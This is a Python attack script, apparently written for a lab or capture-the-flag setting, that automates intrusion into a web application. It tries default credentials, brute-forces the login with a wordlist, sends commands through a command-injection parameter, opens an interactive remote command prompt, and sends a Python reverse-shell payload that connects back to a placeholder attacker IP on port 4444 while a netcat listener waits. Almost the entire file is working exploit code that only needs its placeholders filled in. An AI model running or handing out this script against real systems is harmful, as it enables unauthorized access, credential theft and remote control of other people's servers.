import requests
import sys
import os
import time # Using time.sleep for basic rate limiting

# --- GLOBAL CONFIGURATIONS ---
# IMPORTANT: Replace these placeholder values with your actual target and attacker details.

# Target web application login page URL (if authentication is required)
TARGET_LOGIN_URL = "http://YOUR_TARGET_LOGIN_PAGE.com/login.php" # Example: http://example.com/login

# Target URL where RCE vulnerability exists (e.g., a command execution page)
TARGET_RCE_URL = "http://YOUR_TARGET_RCE_PAGE.com/execute.php" # Example: http://example.com/cmd_exec

# Name of the HTTP parameter used for command injection (e.g., 'cmd', 'command', 'input')
COMMAND_PARAM_NAME = "cmd"

# Your attacker IP address and port for the reverse shell listener
# This should be your VPN IP or AttackBox IP (e.g., 10.10.10.10)
ATTACKER_IP = "YOUR_ATTACKER_IP"
# Port on your machine where netcat (or similar) will listen for the reverse shell
ATTACKER_PORT = 4444

# Known credentials for initial login attempt (if applicable)
# If not known, the script will attempt a brute-force
KNOWN_USERNAME = "admin"
KNOWN_PASSWORD = "password"

# Path to the wordlist file for brute-forcing passwords
# Make sure this file exists in the same directory as the script, or provide a full path.
WORDLIST_FILE_PATH = "passwords.txt"

# Keywords/phrases to identify successful/failed login attempts in the server's response
LOGIN_SUCCESS_INDICATOR = "Welcome"
LOGIN_FAILURE_INDICATOR = "Login failed"

# --- GLOBAL SESSION INITIATION ---
# We'll use a single requests.Session object to manage cookies and maintain state
# across all HTTP requests throughout the script, mimicking a browser.
session = requests.Session()

# --- HELPER FUNCTIONS ---

def load_wordlist(filepath: str) -> list[str] | None:
    """
    Loads words (e.g., passwords) from a text file, one word per line.
    
    Args:
        filepath: The path to the wordlist file.
        
    Returns:
        A list of words, or None if the file cannot be loaded.
    """
    print(f"\n[*] Attempting to load wordlist from: '{filepath}'")
    if not os.path.exists(filepath):
        print(f"[-] Error: Wordlist file '{filepath}' not found. Please check the path.")
        return None
    
    words = []
    try:
        # 'with open' ensures the file is properly closed, even if errors occur.
        # 'encoding' and 'errors='ignore'' help handle various file encodings.
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                words.append(line.strip()) # .strip() removes leading/trailing whitespace and newlines
        print(f"[+] Successfully loaded {len(words)} words from '{filepath}'.")
        return words
    except Exception as e:
        print(f"[-] An error occurred while reading the wordlist file '{filepath}': {e}")
        return None

def perform_login(username_val: str, password_val: str) -> bool:
    """
    Attempts to log in to the target web application.
    Uses the global 'session' object to maintain state (cookies).
    
    Args:
        username_val: The username to attempt.
        password_val: The password to attempt.
        
    Returns:
        True if the login is likely successful, False otherwise.
    """
    print(f"[*] Attempting login as: {username_val}:{password_val}")
    # Adjust 'username' and 'password' keys to match the HTML form field names on the target login page.
    login_data = {"username": username_val, "password": password_val} 
    
    try:
        # Send a POST request through the session. Cookies from the response will be automatically saved.
        response = session.post(TARGET_LOGIN_URL, data=login_data, timeout=10) # Added a timeout for robustness
        
        # Check for success/failure indicators in the response text (case-insensitive for flexibility).
        if LOGIN_FAILURE_INDICATOR.lower() not in response.text.lower() and \
           LOGIN_SUCCESS_INDICATOR.lower() in response.text.lower():
            print(f"[+] Authentication successful for {username_val}:{password_val}!")
            return True
        else:
            # Optionally uncomment for debugging failed logins:
            # print(f"[-] Login failed for {username_val}:{password_val}. Response snippet: {response.text[:200]}...")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] A network or request error occurred during login for '{username_val}:{password_val}': {e}")
        return False
    except Exception as e:
        print(f"[-] An unexpected error occurred during login: {e}")
        return False

def perform_bruteforce_login(username_target: str, wordlist: list[str]) -> tuple[str, str] | None:
    """
    Attempts to brute-force a login for a given username using a wordlist.
    
    Args:
        username_target: The username to brute-force.
        wordlist: A list of passwords to try.
        
    Returns:
        A tuple (username, password) if credentials are found, otherwise None.
    """
    print(f"\n[*] Starting brute-force login for user: {username_target} with {len(wordlist)} passwords.")
    for password_attempt in wordlist:
        # Use sys.stdout.write and \r to display progress on a single line,
        # making the output cleaner and easier to read during long brute-force attempts.
        sys.stdout.write(f"\r[*] Trying: {username_target}:{password_attempt} {' ' * 20}")
        sys.stdout.flush() # Ensure the output is updated immediately
        
        if perform_login(username_target, password_attempt):
            sys.stdout.write(f"\r[+] SUCCESS! Found credentials: {username_target}:{password_attempt}\n")
            sys.stdout.flush()
            return (username_target, password_attempt)
        
        time.sleep(0.1) # Small delay to avoid overwhelming the server and to mimic human behavior
    
    print("\n[-] Brute-force completed. No credentials found in the provided wordlist.")
    return None

def execute_remote_command(command_to_execute: str) -> str | None:
    """
    Executes a command on the target system via the RCE vulnerability, 
    using the current session (after successful login, if applicable).
    
    Args:
        command_to_execute: The command string to send to the target.
        
    Returns:
        The raw text response from the server, or None if the command failed.
    """
    print(f"\n[*] Executing remote command: '{command_to_execute}'")
    params = {COMMAND_PARAM_NAME: command_to_execute} # The parameter holding our command
    
    try:
        # Send the request through the session. Use GET for simple command execution,
        # but change to session.post() if the vulnerability requires a POST request.
        response = session.get(TARGET_RCE_URL, params=params, timeout=15) # Increased timeout for command execution
        
        if response.status_code == 200:
            print("[+] Command successfully sent. Server response:")
            print(response.text.strip()) # .strip() cleans up leading/trailing whitespace
            return response.text
        else:
            print(f"[-] Command execution failed (HTTP Status: {response.status_code}).")
            print(f"[-] Full response: {response.text.strip()}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] A network or request error occurred while sending the RCE command: {e}")
        return None
    except Exception as e:
        print(f"[-] An unexpected error occurred during RCE execution: {e}")
        return None

def initiate_reverse_shell():
    """
    Attempts to send a reverse shell payload to the target via the RCE vulnerability.
    """
    print(f"\n[*] Attempting to initiate a reverse shell to {ATTACKER_IP}:{ATTACKER_PORT}")
    print("[*] IMPORTANT: BEFORE RUNNING THIS EXPLOIT, ENSURE NETCAT IS LISTENING ON YOUR MACHINE/ATTACKBOX:")
    print(f"    In a separate terminal, run: nc -lvnp {ATTACKER_PORT}")

    # Common Python reverse shell payload for Linux systems.
    # This command makes the target system connect back to your listener.
    reverse_shell_payload = (
        f"python -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));"
        f"os.dup2(s.fileno(),0); " # Redirect stdin
        f"os.dup2(s.fileno(),1); " # Redirect stdout
        f"os.dup2(s.fileno(),2);" # Redirect stderr
        f"p=subprocess.call([\"/bin/sh\",\"-i\"]);'" # Execute interactive shell
    )
    
    # Send the payload using our RCE execution function.
    response_rce = execute_remote_command(reverse_shell_payload)
    if response_rce:
        print("[+] Reverse shell payload sent. Check your netcat listener for a connection!")
    else:
        print("[-] Failed to send the reverse shell payload.")

def interactive_rce_shell():
    """
    Provides an interactive pseudo-shell for remote command execution.
    Commands typed here will be sent via the RCE vulnerability.
    """
    print("\n--- Starting interactive RCE shell (type 'exit' or 'quit' to end) ---")
    while True:
        cmd_input = input("RCE-Shell> ")
        if cmd_input.lower() in ["exit", "quit"]:
            print("[*] Exiting RCE shell.")
            break
        execute_remote_command(cmd_input)

# --- MAIN EXPLOIT LOGIC ---
if __name__ == "__main__":
    print("--- Initiating FINAL AUTOMATED EXPLOIT ---")
    
    found_credentials = None

    # Step 1: Attempt Authentication
    # First, try with known/default credentials if they are provided.
    if KNOWN_USERNAME and KNOWN_PASSWORD:
        print(f"[*] Attempting login with known credentials: {KNOWN_USERNAME}:{KNOWN_PASSWORD}")
        if perform_login(KNOWN_USERNAME, KNOWN_PASSWORD):
            found_credentials = (KNOWN_USERNAME, KNOWN_PASSWORD)
        else:
            print("[-] Known credentials did not work.")
    
    # If the static login failed or no known credentials were set, proceed to brute-force.
    if not found_credentials:
        print("[*] Static login failed or not attempted. Trying brute-force...")
        wordlist = load_wordlist(WORDLIST_FILE_PATH)
        if wordlist:
            found_credentials = perform_bruteforce_login(KNOWN_USERNAME, wordlist)
        else:
            print("[-] Cannot proceed with brute-force: wordlist could not be loaded.")

    # Step 2: Proceed to RCE exploitation if authentication was successful.
    if found_credentials:
        print(f"\n[+] Successfully authenticated or used credentials: {found_credentials[0]}:{found_credentials[1]}")
        print("\n--- Moving to RCE Exploitation Phase ---")

        # Basic RCE test: Execute 'whoami' to confirm command execution.
        print("\n[*] Testing RCE with 'whoami' command:")
        execute_remote_command("whoami")
        time.sleep(1) # A short pause for clarity

        # Provide an interactive shell to issue multiple commands.
        interactive_rce_shell()

        # Attempt to get a persistent reverse shell.
        initiate_reverse_shell()
        
        print("\n[+] Automated exploit sequence finished. Check your netcat listener!")
    else:
        print("\n[-] Exploit cannot proceed: Failed to authenticate to the target.")

    print("\n--- Script execution completed. ---")
